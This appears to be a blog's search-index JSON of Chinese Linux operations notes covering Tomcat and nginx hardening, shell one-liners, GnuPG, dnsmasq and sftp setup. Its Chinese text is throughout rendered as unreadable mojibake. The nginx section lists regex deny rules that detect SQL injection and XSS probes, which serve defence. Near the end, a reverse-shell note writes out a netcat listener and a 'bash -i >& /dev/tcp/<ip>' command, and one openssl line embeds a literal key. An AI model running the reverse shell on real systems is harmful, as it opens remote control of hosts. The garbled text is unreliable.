[{"categories":["other"],"content":"åˆä¸€å¤©è¿‡å»äº†ï¼Œä»Šå¤©è¿‡å¾—æ€ä¹ˆæ ·ï¼Œæ¢¦æƒ³æ˜¯ä¸æ˜¯æ›´è¿œäº†ï¼Ÿ","date":"2022-06-22","objectID":"/posts/starting/","tags":["other"],"title":"Starting","uri":"/posts/starting/"},{"categories":["other"],"content":" ç¬¬ä¸€ç¯‡æ–‡ç« å½“ç„¶æ˜¯hello worldäº† echo \"hello world !\" ","date":"2022-06-22","objectID":"/posts/starting/:0:0","tags":["other"],"title":"Starting","uri":"/posts/starting/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"å¸¸ç”¨webç¯å¢ƒä¼˜åŒ–","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/","tags":["linux","ä¼˜åŒ–","nginx","php","è§£å†³æ–¹æ¡ˆ"],"title":"å¸¸ç”¨webç¯å¢ƒä¼˜åŒ–","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":" å‰è¨€ ä¸€ç¯‡åŒ…å«tomcatã€nginxã€phpç­‰ç›¸å…³å‚æ•°åŠæ€§èƒ½çš„ä¼˜åŒ–æ–‡ä»¶ï¼Œçœ‹äº†å¾ˆå¤šï¼Œä½†å´ä¸èƒ½å®Œå…¨è®°ä½ï¼Œæ•´ç†ä¸€ç¯‡ç”¨äºå¤‡å¿˜ã€‚ 1. tomcat æœåŠ¡è°ƒä¼˜ tomcat: 8.5.59 1.1. å®‰å…¨ä¼˜åŒ– é™æƒå¯åŠ¨ æ–°å»ºæ™®é€šç”¨æˆ·ï¼Œåˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·ï¼Œå¯åŠ¨tomcat telnetç®¡ç†ç«¯å£ä¿æŠ¤ ä¿®æ”¹é…ç½®æ–‡ä»¶/pathto/tomcat/conf/server.xml,22è¡Œå·¦å³çš„\u003cServer port=\"8005\" shutdown=\"SHUTDOWN\"\u003e 8005ç«¯å£å’ŒSHUTDOWN(åŒºåˆ†å¤§å°å†™)å…³é”®å­—,é˜²æ­¢tomcatè¢«è¿œç¨‹å…³é—­ ajp è¿æ¥ç«¯å£ä¿æŠ¤ ajp æ˜¯apacheå’Œtomcatç›¸äº’æ²Ÿé€šçš„ä¸€ä¸ªæ¸ é“ï¼Œå¦‚æœä¸ä½¿ç”¨ï¼Œå¯ä»¥æ³¨é‡Šæ‰æˆ–è€…ä¿®æ”¹ç«¯å£ /pathto/tomcat/conf/server.xml: 123 ã€‚ ç¦ç”¨ç®¡ç†ç«¯ ä¸€èˆ¬ç®¡ç†ç«¯ç”¨äºæµ‹è¯•ä½¿ç”¨,æ­£å¼ä½¿ç”¨éœ€è¦åˆ é™¤/pathto/tomcat/webappsä¸‹æ‰€æœ‰ç›®å½•,æ–°å»ºçš„ç«™ç‚¹æ”¾åˆ°è¯¥ç›®å½•çš„ROOTä¸‹å³å¯,å¦åˆ é™¤/pathto/tomcat/conf/tomcat-users.xmlä¸‹å…³äºè§’è‰²çš„é…ç½®(æˆ–è€…åˆ æ‰è¿™ä¸ªæ–‡ä»¶,ä¼¼ä¹ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå½±å“)ã€‚ æ–‡ä»¶è®¿é—®åˆ—è¡¨æ§åˆ¶ web.xml: 121 é…ç½®listingså€¼ä¸ºfalseï¼Œ é»˜è®¤false éšè—ç‰ˆæœ¬ä¿¡æ¯ å¯ä¿®æ”¹conf/web.xmlä¸­å…³äºerror-pageçš„ç›¸å…³é…ç½®(å®é™…ä¸Šä¸ªäººåœ¨5.8ä¸­å¥½åƒæ²¡æœ‰æ‰¾åˆ°è¿™å—çš„),ä¹Ÿå¯ä»¥ä¿®æ”¹ç«™ç‚¹ä¸­WEB-INF/web.xmlä¸­çš„é”™è¯¯é¡µ è®¿é—®æ§åˆ¶é™åˆ¶ conf/server.xml: Host ä¸‹æ·»åŠ \u003cValve className=\"org.apache.catalina.valves.RemoteAddrValve\" allow=\"10.0.2.*\"/\u003e å¯åŠ¨è„šæœ¬æƒé™ä¿®æ­£744 åº”ç”¨è‡ªåŠ¨éƒ¨ç½² conf/server.xml: 158 ä¿®æ”¹å‚æ•°unpackWARså’ŒautoDeploy: \u003cHost name=\"localhost\" appBase=\"webapps\" unpackWARs=\"false\" autoDeploy=\"false\"\u003e 1.2. æ€§èƒ½ä¼˜åŒ– å±è”½dnsæŸ¥è¯¢ enableLookups=\"false\": 69 : /pathto/tomcat/conf/server.xml(é…ç½®é»˜è®¤ç«¯å£é‚£å„¿) jvm è°ƒä¼˜ JAVA_OPTS=æ ¹æ®ç›‘æ§åè°ƒå‚æ•°ã€‚ å¯ç”¨nio2(conf/server.xml) Nio2å¯ç”¨åzabbixå¸¦æœ‰çš„æ¨¡æ¿ç›‘æ§ä¼šå‡ºç°å¤§é‡çš„ç›‘æ§é¡¹æ— æ•ˆï¼ŒObject or attribute not found. æ­¤é—®é¢˜æš‚æ—¶è¿˜æœªæ‰¾åˆ°è§£å†³æ–¹æ¡ˆ \u003cConnector executor=\"tomcatThreadPool\" port=\"8080\" enableLookups=\"false\" protocol=\"org.apache.coyote.http11.Http11Nio2Protocol\" connectionTimeout=\"20000\" redirectPort=\"8443\" /\u003e 2. tmpfs ä¸€ç§åŸºäºå†…å­˜çš„æ–‡ä»¶ç³»ç»Ÿ å¯ç”¨äºæŒ‚è½½ä¸´æ—¶æ–‡ä»¶å­˜æ”¾ç›®å½•,æŒ‚è½½åæ“ä½œç›®å½•ç›¸å½“äºç›´æ¥æ“ä½œå†…å­˜ï¼ŒumountåæŒ‚è½½ç›®å½•æ•°æ®ä¼šè¢«ç›´æ¥æ¸…ç©ºã€‚ mount -t tmpfs -o size=1024M tmpfs /mnt/usb02 3. nginx ä¼˜åŒ– nginx è§„åˆ™åŒ¹é…ä¼˜å…ˆçº§: = \u003e å®Œæ•´è·¯å¾„ \u003e ^~ \u003e ~|~* \u003e éƒ¨åˆ†èµ·å§‹è·¯å¾„ \u003e / é˜²æ­¢SQLæ³¨å…¥ã€XSSæ”»å‡»çš„å®è·µé…ç½®æ–¹æ³• if ($request_method !~* GET|POST) { return 444; } #ä½¿ç”¨444é”™è¯¯ä»£ç å¯ä»¥æ›´åŠ å‡è½»æœåŠ¡å™¨è´Ÿè½½å‹åŠ›ã€‚ if ($query_string ~* \"(\\$|'|--|[+|(%20|%2F)]union[+|(%20|%2F)]|[+|(%20|%2F)]insert[+|(%20|%2F)]|[+|(%20|%2F)]drop[+|(%20|%2F)]|[+|(%20|%2F)]truncate[+|(%20|%2F)]|[+|(%20|%2F)]update[+|(%20|%2F)]|[+|(%20|%2F)]from[+|(%20|%2F)]|[+|(%20|%2F)]grant[+|(%20|%2F)]|[+|(%20|%2F)]exec[+|(%20|%2F)]|[+|(%20|%2F)]where[+|(%20|%2F)]|[+|(%20|%2F)]select[+|(%20|%2F)]|[+|(%20|%2F)]and[+|(%20|%2F)]|[+|(%20|%2F)]or[+|(%20|%2F)]|[+|(%20|%2F)]count[+|(%20|%2F)]|[+|(%20|%2F)]exec[+|(%20|%2F)]|[+|(%20|%2F)]chr[+|(%20|%2F)]|[+|(%20|%2F)]mid[+|(%20|%2F)]|[+|(%20|%2F)]like[+|(%20|%2F)]|[+|(%20|%2F)]iframe[+|(%20|%2F)]|[\\\u003c|%3C]script[\\\u003e|%3E]|javascript|alert|webscan|dbappsecurity|style|confirm\\(|innerhtml|innertext)(.*)$\") { return 555; } if ($uri ~* \"(/~).*\") { return 501; } if ($uri ~* \"(\\\\x.)\") { return 501; } if ($query_string ~* \"[;'\u003c\u003e].*\") { return 509; } if ($request_uri ~ \" \") { return 509; } if ($request_uri ~ \"(\\/\\.+)\") { return 509; } if ($request_uri ~ \"(\\.+\\/)\") { return 509; } # sql æ³¨å…¥ # if ($uri ~* \"(insert|select|delete|update|count|master|truncate|declare|exec|\\*|\\')(.*)$\" ) { return 508; } if ($query_string ~ \"concat.*\\(\") { return 508; } if ($query_string ~ \"union.*select.*\\(\") { return 508; } if ($query_string ~ \"union.*all.*select.*\") { return 508; } if ($request_uri ~* \"(cost\\()|(concat\\()\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]union[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]and[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]select[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]or[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]delete[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]update[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]insert[+|(%20|%2F)]\") { return 508; } ## å¸¸è§æ¼æ´åˆ©ç”¨ if ($query_string ~ \"(\u003c|%3C).*script.*(\u003e|%3E)\") { return 403; } if ($query_string ~ \"GLOBALS(=|\\[|\\%[0-9A-Z]{0,2})\") { return 403; } if ($query_string ~ \"_REQUEST(=|\\[|\\%[0-9A-Z]{0,2})\") { return 403; } if ($query_string ~ \"proc/self/environ\") { return 403; } if ($query_string ~ \"mosConfig_[a-zA-Z_]{1,21}(=|\\%3D)\") { return 403; } if ($query_string ~ \"base64_(en|de)code\\(.*\\)\") { return 403; } # åƒåœ¾é‚®ä»¶å­—æ®µ if ($query_string ~ \"\\b(ultram|unicauca|valium|viagra|vicodin|xanax|ypxaieo)\\b\") { return 507; } if ($query_string ~ \"\\b(erections|hoodia|huronriveracres|impotence|levitra|libido)\\b\") { retur","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:0:0","tags":["linux","ä¼˜åŒ–","nginx","php","è§£å†³æ–¹æ¡ˆ"],"title":"å¸¸ç”¨webç¯å¢ƒä¼˜åŒ–","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"æ”¶é›†äº†ä¸€äº›å¸¸ç”¨å’Œæœ‰è¶£çš„å‘½ä»¤","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"å¸¸ç”¨å‘½ä»¤æ”¶é›†","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"å¼•å…¥ä¸€ä¸ªæ›´ä¸ºä¸“ä¸šçš„å‘½ä»¤æ”¶é›†ç«™ç‚¹ : https://www.commandlinefu.com/commands/browse ç»Ÿè®¡ç¬¬ä¸€åˆ—ç›¸åŒï¼Œç¬¬äºŒåˆ—å¹³å‡å€¼ cat xxx |awk '{a[$1]+=$2;c[$1]++}END{l=asorti(a,b);for(i=1;i\u003c=l;i++)print b[i],a[b[i]]/c[b[i]]}' æ—¶é—´æ®µç»Ÿè®¡æ—¥å¿—ï¼š sed -n '/2018:02:30/,/2018:03:00/p' www.log |awk '{a[$1]+=1;} END {for(i in a){print a[i]\" \"i;}}' |sort -t \" \" -k 1 -n sed -n '/2018:01:50/,/2018:02:00/p' www.log |grep \"list?\" |awk '{a[$1]+=1;} END {for(i in a){print a[i]\" \"i;}}' |sort -t \" \" -k 1 -n # æ›´åŠ ç²¾å‡†çš„ç»Ÿè®¡ grep -E '22/Oct/2025:(19|20|21|22|23):|23/Oct/2025:0[0-3]:' www.log | awk '{a[$1]+=1;} END {for(i in a){print a[i]\" \"i;}}' |sort -t \" \" -k 1 -n æŒ‰ç…§ ip æ’åº # å‡åº sort -t'.' -k1,1n -k2,2n -k3,3n -k4,4n ip.txt # é™åº sort -t'.' -k1,1nr -k2,2nr -k3,3nr -k4,4nr ip.txt shell ä¸­è·å–è„šæœ¬ç»å¯¹è·¯å¾„ SHELL_DIR=$(dirname $(readlink -f \"$0\")) SHELL_DIR=$(cd `dirname $0`; pwd) tailf æ˜¾ç¤ºé«˜äº® tail -f www.log | perl -pe 's/(\\/pattern1\\/pattern2)/\\e[1;31m$1\\e[0m/g' tail -f www.log |grep --color -E 'pattern|$' openssl é€šè¿‡è¯ä¹¦åŠ å¯†è§£å¯†å¤§æ–‡ä»¶ mkdir /etc/encrypt \u0026\u0026 cd /etc/encrypt openssl genrsa -out private.pem 2048 openssl rsa -in private.pem -outform PEM -pubout -out public.pem openssl rand -base64 32 \u003e key.bin # è¿œç¨‹ä¼ è¾“å»ºè®®æ¯æ¬¡éƒ½æ–°å»º # åŠ å¯† openssl rsautl -encrypt -pubin -inkey /etc/encrypt/public.pem -in /etc/encrypt/key.bin -out /etc/encrypt/key.bin.enc openssl aes-256-cfb -a -pbkdf2 -salt -in filename.gz -out filename.gz.enc -k $(cat /etc/encrypt/key.bin) # è§£å¯† openssl rsautl -decrypt -inkey private.pem -in key.bin.enc -out key.bin openssl aes-256-cfb -d -a -pbkdf2 -in filename.gz.enc -out filename.gz -k $(cat key.bin) # åŠ å¯† tar -czf - * | openssl aes-256-cfb -salt -k \"8CASiU6zxAWy9QZ8wj+MgIzqHsBnXjgkHNvWeJ0urHw=\" -out ssh.key.pem.enc openssl aes-256-cfb -d -salt -in ssh.key.pem.enc -out ssh_key.pem.tar.gz æ‰‹åŠ¨æ£€æµ‹: æ¯åˆ†é’Ÿè¿æ¥æ¬¡æ•° netstat -ntu | awk '{print $5}' |cut -d: -f1|sort|uniq -c |sort -n netstat -an |grep ^tcp.*:80|egrep -v 'LISTEN|127.0.0.1'|awk -F\"[ ]+|[:]\" '{print $6}'|sort|uniq -c|sort -rn linux ç”¨ tcpdump æŸ¥çœ‹ 80 ç«¯å£è®¿é—®æœ‰å“ªäº› IP tcpdump -i eth0 -tnn dst port 80 -c 1000|awk -F\".\" '{print $1\".\"$2\".\"$3\".\"$4}'|sort|uniq -c|sort -rn|head -n20 æŸ¥çœ‹ linux å†…å­˜å ç”¨æœ€é«˜çš„ 10 ä¸ªè¿›ç¨‹ ps aux|head -1 \u0026\u0026 ps aux|grep -v PID|sort -rn -k +4|head linux æŸ¥çœ‹ cpu å ç”¨æœ€é«˜çš„ 10 ä¸ªè¿›ç¨‹ ps aux|head -1;ps aux|grep -v PID|sort -rn -k +3|head linux æŸ¥çœ‹å‘½ä»¤æ¥æºäºé‚£ä¸ªåŒ…(yum ä¹Ÿé€‚ç”¨) dnf provides htop linux æŸ¥çœ‹å·²å®‰è£…çš„å‘½ä»¤åŸæ¥äºé‚£ä¸ªåŒ… rpm -qf /usr/bin/htop linux æŸ¥çœ‹ rpm åŒ…ä¿¡æ¯ rpm -qpi xxx.rpm linux æŸ¥çœ‹ rpm åŒ…å†…å®¹ rpm -qpl xxx.rpm linux æŸ¥çœ‹ rpm åŒ…ä¾èµ– rpm -qpR xxx.rpm linux æŸ¥çœ‹ rpm åŒ…å¸¦çš„æ‰§è¡Œè„šæœ¬ rpm -qp --scripts xxx.rpm linux è‡ªåŠ¨å®‰è£… rpm åŒ…ä¾èµ–(dnf é»˜è®¤å·²å­˜åœ¨è¯¥åŠŸèƒ½) yum -y localinstall xxx.rpm linux rpm å¾ªç¯å®‰è£…åŒ…ä¾èµ– # å…³äºå¾ªç¯å®‰è£…æ˜¯æŒ‡çš„æ˜¯ä¸»rpmåŒ…çš„æ‰€æœ‰çš„ä¾èµ–åŒ…åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œä¼šè‡ªåŠ¨å®‰è£…å…¶ä¾èµ–ååœ¨å®‰è£…ä¸»rpmåŒ…ï¼Œ(æ­¤æ–¹æ³•ç¼ºé™·è¾ƒå¤§) rpm -ivh --aid *.rpm æ¸…é™¤åƒµæ­»è¿›ç¨‹ ps -eal | awk '{ if ($2 == \"Z\") {print $4}}' | kill -9 LNMP/LAMP ç¯å¢ƒæŸ¥çœ‹ç¼–è¯‘å‚æ•° # nginx /pathto/nginx/sbin/nginx -V # apache /pathto/apache/build/config.nice # mysql grep CONFIGURE_LINE /usr/bin/mysqlbug # php /pathto/php/bin/php -i|grep configure è®©ä¸åŒçš„è¿›ç¨‹ä½¿ç”¨ä¸åŒçš„ cpu # taskset -c,--cpu-list command taskset -c 0,1,2,3 /etc/init.d/mysql start watch ç›‘æµ‹å‘½ä»¤è¿è¡Œç»“æœ # ç±»ä¼¼tailf,ä½†æ˜¯é’ˆå¯¹å‘½ä»¤ # æŸ¥çœ‹å½“å‰ç›®å½•å†…å®¹å˜åŒ– # watch ls # watch \"netstat -ntu | awk '{print $5}' |cut -d: -f1|sort|uniq -c |sort -n\" åˆ›å»ºä¸€ä¸ªå…·æœ‰ç‰¹å®šæƒé™çš„ç©ºæ–‡ä»¶ #install -b -m \u003cæƒé™\u003e \u003cæ¥æº\u003e \u003cç›®æ ‡\u003e install -b -m 777 /dev/null file.txt åˆ›å»ºä¸€ä¸ªå…·æœ‰ç‰¹å®šæƒé™çš„ç›®å½• # install -d -o \u003cç”¨æˆ·å\u003e -g \u003cç”¨æˆ·ç»„\u003e -m \u003cæƒé™\u003e \u003cç›®æ ‡åœ°å€\u003e install -d -o www -g www -m 755 /run/php-fpm é€šè¿‡ sshfs è¿œç¨‹æŒ‚è½½ç›®å½• yum install sshfs # mount sshfs -o reconnect,_netdev,user,idmap=user,identityfile=/pathto/id_rsa,default_permissions user@host:/path /mnt/pathto # /etc/fstab user@host:/path /mnt/pathto fuse.sshfs noauto,x-systemd.automount,reconnect,_netdev,user,idmap=user,identityfile=/pathto/id_rsa,allow_other,default_permissions 0 0 tmpfs ä¸€ç§åŸºäºå†…å­˜çš„æ–‡ä»¶ç³»ç»Ÿ mount -t tmpfs -o size=1024M tmpfs /mnt/usb02 æ–‡ä»¶æè¿°ç¬¦ç›¸å…³ ç‚¹å‡»å±•å¼€è¯¦ç»†å†…å®¹ ç³»ç»Ÿæœ€å¤§æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦æ•°é‡ cat /proc/sys/fs/file-nr 10848 0 6815744 # ç¬¬ä¸€ä¸ªå€¼: å½“å‰ç³»ç»Ÿå·²åˆ†é…ä½¿ç”¨çš„æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•° # ç¬¬äºŒä¸ªå€¼: ä¸ºåˆ†é…åå·²é‡Šæ”¾çš„ï¼ˆç›®å‰å·²ä¸å†ä½¿ç”¨ï¼‰ # ç¬¬ä¸‰ä¸ªå€¼: ç­‰äº/proc/sys/fs/file-max(æ‰“å¼€çš„æœ€å¤§fdæ•°é‡) è·å–æ‰“å¼€çš„æ–‡ä»¶æ•°é‡ è·å–æ•´ä¸ªç³»ç»Ÿæ‰“å¼€çš„æ–‡ä»¶æ•°é‡ lsof | wc -l è·å–æŸä¸ªç”¨æˆ·æ‰“å¼€çš„æ–‡ä»¶æ•°é‡ lsof -u test |wc -l è·å–æŸä¸ªç¨‹åºæ‰“å¼€çš„æ–‡ä»¶æ•°é‡ for i in `pidof dotnet`; do lsof -p \"$i\" | wc -l ; done è·å–æŸä¸ªç¨‹åºæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦æ•°é‡ for i ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"å¸¸ç”¨å‘½ä»¤æ”¶é›†","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"é‚£äº›æ‚ä¸ƒæ‚å…«çš„è®°å½•(ä¸€)","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"é‚£äº›æ‚ä¸ƒæ‚å…«çš„è®°å½•(ä¸€)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"GnuPG åŠ å¯†ä¸è§£å¯† gpg å¯¹ç§°åŠ å¯† åŠ å¯†: gpg -c \u003cfile\u003eï¼Œ è¾“å…¥ä¸¤æ¬¡åŠ å¯†å¯†ç ï¼Œå®Œæˆåç”Ÿæˆæ–‡ä»¶\u003cfile\u003e.gpg(åŠ å¯†åæºæ–‡ä»¶ä¿ç•™) è§£å¯†: gpg \u003cfile\u003e.gpg, è¾“å…¥åŠ å¯†å¯†ç ,æ­£ç¡®åç”Ÿæˆæ–‡ä»¶\u003cfile\u003e(è§£å¯†ååŠ å¯†æ–‡ä»¶ä¿ç•™) gpg éå¯¹ç§°åŠ å¯† éå¯¹ç§°åŠ å¯†/è§£å¯†æ–‡ä»¶æ—¶ï¼ŒServer ç”Ÿæˆç§é’¥ä¸å…¬é’¥ï¼Œå¹¶æŠŠå…¬é’¥å‘é€ç»™Client, Client ä½¿ç”¨å…¬é’¥åŠ å¯†æ•°æ®ï¼Œå¹¶æŠŠåŠ å¯†åçš„æ•°æ®ä¼ ç»™Server ï¼ŒServer æœ€åä½¿ç”¨è‡ªå·±çš„ç§é’¥è§£å¯†æ•°æ®ã€‚ # Server: åˆ›å»ºå…¬é’¥ç§é’¥ $\u003e gpg --gen-key # éœ€è¦å¡«å†™ä¸€äº›ä¸œè¥¿ï¼Œå¯æ ¹æ®éœ€æ±‚é€‰æ‹© ## é…ç½®æ–‡ä»¶ä»‹ç» # GPG é…ç½®æ–‡ä»¶ç›®å½•:~/.gnupg # ~/.gnupg/gpg.conf â€“ é…ç½®æ–‡ä»¶ # ~/.gnupg/trustdb.gpg â€“ ä¿¡ä»»åº“ # ~/.gnupg/pubring.gpg â€“ å…¬é’¥åº“ # ~/.gnupg/secring.gpg â€“ ç§é’¥åº“ $\u003e gpg --list-key # å¯†é’¥æŸ¥çœ‹ $\u003e gpg -a --export \u003cUserID\u003e \u003e ./public-key.pub # Server: å…¬é’¥å¯¼å‡º UserID ä¸ºå…¬ç§é’¥åˆ›å»ºæ—¶å€™ç”Ÿæˆçš„ï¼Œå³ gpg: å¯†é’¥ \u003cUserID\u003e è¢«æ ‡è®°ä¸ºç»å¯¹ä¿¡ä»» # å°†å…¬é’¥ä¼ é€åˆ°Clientä¸Š # Client: å¯¼å…¥ å…¬é’¥ $\u003e gpg --import ./public-key.pub # Client: æ–‡ä»¶åŠ å¯† $\u003e gpg -e -r \u003cUserID\u003e \u003cfile\u003e \u003cfile\u003e.gpg # åŠ å¯†å®Œæˆåå°†æ–‡ä»¶ä¼ é€è‡³Server è¿›è¡Œè§£å¯†ï¼Œæ­¤æ—¶Clientä¸Šæ˜¯ä¸å¯è§£å¯†çš„ï¼Œè¦è§£å¯†éœ€è¦ç§é’¥ # Server: æ–‡ä»¶è§£å¯† $\u003e gpg -d \u003cfile\u003e.gpg \u003cfile\u003e DOCKER åˆ›å»º DNS SERVER $\u003e vim /data/docker/dns/dnsmasq.conf #dnsmasq config, for a complete example, see: # http://oss.segetech.com/intra/srv/dnsmasq.conf #log all dns queries log-queries #dont use hosts nameservers no-resolv #use cloudflare as default nameservers, prefer 1^4 server=8.8.4.4 server=8.8.8.8 strict-order #serve all .company queries using a specific nameserver server=/company/10.0.0.1 #explicitly define host-ip mappings address=/www.example.com/172.16.10.10 $\u003e docker run -d -p 53:53/udp -p 53:53/tcp -p 5380:8080 -v /data/docker/dns/dnsmasq.conf:/etc/dnsmasq.conf --log-opt \"max-size=100m\" -e \"HTTP_USER=root\" -e \"HTTP_PASS=root\" jpillora/dnsmasq dotnet ç¯å¢ƒæ­å»º $\u003e rpm -Uvh https://packages.microsoft.com/config/rhel/7/packages-microsoft-prod.rpm $\u003e yum install libgdiplus-devel libunwind icu -y $\u003e wget https://packages.microsoft.com/rhel/7/prod/dotnet-sdk-2.1.200-rhel-x64.rpm $\u003e yum install dotnet-sdk-2.1.200-rhel-x64.rpm -y $\u003e dotnet --info # supervisor ç®¡ç† https://blog.0x5c0f.cc/2019/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86 yum install supervisor -y # å‰ç«¯ç®¡ç†æ ·å¼é¡µé¢ /usr/lib/python2.7/site-packages/supervisor/ui/status.html åœ¨Linuxä¸­åˆ é™¤virbr0æ¥å£ virbr0æ˜¯CentOS7åœ¨å®‰è£…è¿‡ç¨‹ä¸­é€‰æ‹©äº†ç›¸å…³è™šæ‹ŸåŒ–çš„æœåŠ¡å®‰è£…åäº§ç”Ÿçš„,å®é™…ä¸Šå¥½åƒæ˜¯æ²¡ä»€ä¹ˆåµç”¨çš„ $\u003e virsh net-list $\u003e virsh net-destroy default $\u003e virsh net-undefine default $\u003e systemctl restart libvirtd.service Linux æ€æ¯’è½¯ä»¶ clamav # éœ€è¦å®‰è£…epelæº $\u003eã€€yum install clamav-server clamav-data clamav-update clamav-filesystem clamav clamav-scanner-systemd clamav-devel clamav-lib clamav-server-systemd # æ³¨é‡Šæ‰ /etc/freshclam.conf /etc/clamd.d/scan.conf ä¸­çš„Example # æ›´æ–°ç—…æ¯’åº“ã€€$\u003e /usr/bin/freshclam # æ‰«æ $\u003e clamscan -ri /data --remove -l /var/log/clamscan.log linux åˆå¹¶æ–‡ä»¶ç³»ç»Ÿ margerfs https://wzyboy.im/post/1148.html https://github.com/trapexit/mergerfs ä½¿ç”¨ç¤ºä¾‹: # æŒ‚è½½åˆ°çš„ç›®å½•å¿…é¡»ä¸ºç©º # å‘½ä»¤æŒ‚è½½ $\u003e mergerfs -o defaults,allow_other,use_ino,minfreespace=10G,ignorepponrename=true /data01:/data02 /shares # fstab $\u003e /etc/fstab /data01:/data02 /shares fuse.mergerfs defaults,noauto,allow_other,use_ino,minfreespace=10G,ignorepponrename=true 0 0 linux sftp æ­å»º # ç¼–è¾‘æ–‡ä»¶ /etc/ssh/sshd_config,æœ«å°¾æ·»åŠ (æ–°å»ºçš„ç”¨æˆ·è‹¥ä»…ä½¿ç”¨sftpå¯ä»¥ä¸æŒ‡å®šå¯ç™»é™†çš„bash) # è‹¥æƒ³è¦è®©sftpæ›´åƒç™»é™†åˆ°äº†æœåŠ¡å™¨,å¯é…åˆchrootæ¥æ§åˆ¶,å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥åˆ›å»ºè´¦å·ï¼Œä½†ä¸€èˆ¬ä¸å»ºè®® # Match Group/User www # é™åˆ¶æŸä¸ªç»„æˆ–è€…æŸä¸ªç”¨æˆ·ä½¿ç”¨ä»¥ä¸‹è§„åˆ™ # ä»…å…è®¸ä½¿ç”¨sftp , -l INFO è¡¨ç¤ºè®°å½• SFTP çš„ INFO çº§åˆ«æ—¥å¿—ã€‚-f AUTH æŒ‡å®š SFTP é‰´æƒæ—¥å¿—çº§åˆ«ä¸º AUTH ForceCommand internal-sftp -l INFO -f AUTH # ç¦æ­¢ä½¿ç”¨å¯†ç è¿›è¡Œèº«ä»½éªŒè¯ï¼Œåªå…è®¸é€šè¿‡å…¬é’¥è®¤è¯ PasswordAuthentication no # ç¦æ­¢ SSH éš§é“åŠŸèƒ½ PermitTunnel no # ç¦æ­¢ SSH ä»£ç†è½¬å‘ AllowAgentForwarding no # ç¦æ­¢ TCP è½¬å‘ AllowTcpForwarding no ç›‘å¬æœ¬åœ°ç½‘å¡ä¸Šæ²¡æœ‰çš„IPåœ°å€ # ä¸€èˆ¬ç”¨äº keepalive + nginx ä½¿ç”¨ echo 'net.ipv4.ip_nonlocal_bind = 1' \u003e\u003e /etc/sysctl.conf è…¾è®¯äº‘ç¬¬äºŒå—ç½‘å¡ç»‘å®šå…¬ç½‘ip å®˜æ–¹æ–‡æ¡£æ˜¯æœ‰è®°å½•çš„ï¼Œè¿™å„¿è®°å½•ä¸‹æœåŠ¡å™¨ä¸Šçš„è®¾ç½® # ç½‘å¡åˆå§‹åŒ– DEVICE=eth1 NM_CONTROLLED=yes ONBOOT=yes IPADDR=\u003cç½‘å¡2IP\u003e NETMASK=255.255.240.0 # echo \"10 t1\" \u003e\u003e /etc/iproute2/rt_tables echo \"20 t2\" \u003e\u003e /etc/iproute2/rt_tables /usr/sbin/ip route add default dev eth0 via 172.21.0.1 table 10 /usr/sbin/ip route add default dev eth1 via 172.21.0.1 table 20 /usr/sbin/ip rule add from 172.21.2.168 table 10 /usr/sbin/ip rule add from 172.21.2.74 table 20 shell åå¼¹ https://blog.csdn.net/weixin_41082546/article/details/104123131 # è¢«æ§ç«¯æ‰§è¡Œ nc -lvp 65535 # æ§åˆ¶ç«¯æ‰§è¡Œ bash -i \u003e\u0026 /dev/tcp/\u003cè¢«æ§ç«¯ip\u003e/65535 0\u003e\u00261 nginx è·å–cdnçœŸå®ç”¨æˆ·ip # client_real_ip å³ä¸ºç”¨æˆ·çœŸå®IP,å¯ç›´æ¥ç”¨äºæ›¿æ¢ remote_addr 